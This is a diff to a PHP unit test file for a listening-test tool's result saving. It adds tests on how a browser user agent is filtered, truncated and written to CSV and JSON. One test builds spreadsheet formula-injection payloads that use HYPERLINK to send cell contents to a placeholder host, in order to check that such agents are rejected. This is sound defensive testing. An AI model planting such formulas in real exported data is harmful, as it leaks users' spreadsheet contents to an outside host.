@@ -101,6 +101,8 @@ final class SaveTest extends TestCase
 
     // -- metrics ----------------------------------------------------------
 
+    private const FIREFOX = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0';
+
     public function testEnabledMetricsKeepsOnlyWhatWasOptedInto(): void
     {
         $this->assertSame([], enabled_metrics([]));
@@ -122,23 +124,85 @@ final class SaveTest extends TestCase
         $this->assertSame([], answer_metrics([], $keys));
     }
 
+    public function testAnswerMetricsLeaveTheSessionMetricsOut(): void
+    {
+        // The page never sends a user agent, so one in an answer is crafted.
+        $answer = ['dwell_time' => 2.5, 'user_agent' => 'crafted'];
+        $this->assertSame(
+            ['dwell_time' => 2.5],
+            answer_metrics($answer, ['dwell_time', 'user_agent'])
+        );
+    }
+
+    public function testSessionMetricsTakeTheUserAgentFromTheRequest(): void
+    {
+        $this->assertSame(
+            ['user_agent' => self::FIREFOX],
+            session_metrics(self::FIREFOX, ['dwell_time', 'user_agent'])
+        );
+        $this->assertSame([], session_metrics('', ['user_agent']));
+        $this->assertSame([], session_metrics(self::FIREFOX, ['dwell_time']));
+    }
+
+    public function testSessionMetricsLeaveOutAUserAgentASpreadsheetWouldReadAsAFormula(): void
+    {
+        // No browser's starts like this, so it is crafted. See
+        // _FORMULA_PREFIXES in listen_and_rate/routers/api/_shared.py.
+        foreach (['=', '+', '-', '@', "\t", "\r"] as $prefix) {
+            $agent = $prefix . 'HYPERLINK("http://x.example/?"&A1,"click")';
+            $this->assertSame([], session_metrics($agent, ['user_agent']), $prefix);
+        }
+    }
+
+    public function testSessionMetricsLeaveOutAUserAgentThatIsNotPrintableAscii(): void
+    {
+        // No browser's is anything else. Cut or not, a byte outside ASCII
+        // would make the result file invalid UTF-8.
+        foreach (["Mozilla/5.0 caf\u{e9}", "Mozilla/5.0 caf\xe9", "Mozilla/5.0 \x01"] as $agent) {
+            $this->assertSame([], session_metrics($agent, ['user_agent']), bin2hex($agent));
+        }
+    }
+
+    public function testSessionMetricsCutALongUserAgentToItsFirst512Characters(): void
+    {
+        $agent = 'Mozilla/5.0 ' . str_repeat('x', 600);
+        $this->assertSame(
+            ['user_agent' => substr($agent, 0, 512)],
+            session_metrics($agent, ['user_agent'])
+        );
+    }
+
     public function testAppendMetricsColumnsPutsThemLast(): void
     {
         [$fields, $rows] = append_metrics_columns(
             ['session_id', 'system', 'rating'],
             [['s1', 'A', 4], ['s1', 'B', 3]],
             [['dwell_time' => 2.5], ['dwell_time' => 9.0]],
-            ['dwell_time']
+            ['user_agent' => self::FIREFOX],
+            ['dwell_time', 'user_agent']
         );
-        $this->assertSame(['session_id', 'system', 'rating', 'metrics_dwell_time'], $fields);
+        $this->assertSame(
+            ['session_id', 'system', 'rating', 'metrics_dwell_time', 'metrics_user_agent'],
+            $fields
+        );
         // Fixed decimals, so a whole number keeps them instead of PHP's own
-        // float-to-string collapsing 9.0 to "9" - see METRIC_DECIMALS.
-        $this->assertSame([['s1', 'A', 4, '2.50'], ['s1', 'B', 3, '9.00']], $rows);
+        // float-to-string collapsing 9.0 to "9" - see METRIC_DECIMALS. The
+        // session's metrics repeat on every row, text as it is.
+        $this->assertSame(
+            [['s1', 'A', 4, '2.50', self::FIREFOX], ['s1', 'B', 3, '9.00', self::FIREFOX]],
+            $rows
+        );
+    }
+
+    public function testAppendMetricsColumnsLeavesAnUnmeasuredMetricBlank(): void
+    {
+        [, $rows] = append_metrics_columns(['a'], [['x']], [[]], [], ['dwell_time', 'user_agent']);
+        $this->assertSame([['x', '', '']], $rows);
     }
 
     public function testAppendMetricsColumnsIsANoOpWhenNothingIsCollected(): void
     {
-        [$fields, $rows] = append_metrics_columns(['a'], [['x']], [['dwell_time' => 1]], []);
+        [$fields, $rows] = append_metrics_columns(['a'], [['x']], [['dwell_time' => 1]], [], []);
         $this->assertSame(['a'], $fields);
         $this->assertSame([['x']], $rows);
     }
@@ -148,7 +212,7 @@ final class SaveTest extends TestCase
         $entries = append_metrics_json(
             [['system' => 'A', 'rating' => 4], ['system' => 'B', 'rating' => 3]],
             [['dwell_time' => 2.5], ['dwell_time' => 9.0]],
-            ['dwell_time']
+            ['dwell_time', 'user_agent']
         );
         $this->assertSame(['dwell_time' => 2.5], $entries[0]['metrics']);
         $this->assertSame(['dwell_time' => 9.0], $entries[1]['metrics']);
@@ -170,6 +234,31 @@ final class SaveTest extends TestCase
         $path = $this->tmpDir . '/r.json';
         write_json_file($path, ['records' => [['metrics' => ['dwell_time' => 9.0]]]]);
         $this->assertStringContainsString('9.0', file_get_contents($path));
+    }
+
+    public function testWriteJsonFileRefusesWhatItCannotEncodeAndLeavesNoFile(): void
+    {
+        // json_encode returns false on a string that is not valid UTF-8.
+        // Written anyway, that is an empty file reported as saved - one the
+        // report then fails to read, and one that blocks a retry with a 409.
+        $path = $this->tmpDir . '/r.json';
+        try {
+            write_json_file($path, ['metrics' => ['user_agent' => "caf\xe9"]]);
+            $this->fail('Expected a SaveRequestError');
+        } catch (SaveRequestError $e) {
+            $this->assertSame(500, $e->status);
+        }
+        $this->assertFileDoesNotExist($path);
+    }
+
+    public function testWriteJsonFileLeavesSlashesUnescaped(): void
+    {
+        // json_encode writes "/" as "\/" without this flag, where json.dump
+        // writes it as it is - so a user agent would read differently in the
+        // PHP deployment's file than in the FastAPI one's.
+        $path = $this->tmpDir . '/r.json';
+        write_json_file($path, ['metrics' => ['user_agent' => self::FIREFOX]]);
+        $this->assertStringContainsString(self::FIREFOX, file_get_contents($path));
     }
 
     // -- validate_submission_shape ----------------------------------------
@@ -1343,11 +1432,12 @@ final class SaveTest extends TestCase
                 'metadata' => [],
                 'records' => [],
                 'survey' => [],
+                'metrics' => [],
             ],
             '0.2.0'
         );
         $this->assertSame(
-            ['tool_version', 'session_id', 'timestamp', 'test_type', 'metadata', 'survey', 'records'],
+            ['tool_version', 'session_id', 'timestamp', 'test_type', 'metadata', 'survey', 'metrics', 'records'],
             array_keys($result)
         );
         $this->assertSame('0.2.0', $result['tool_version']);
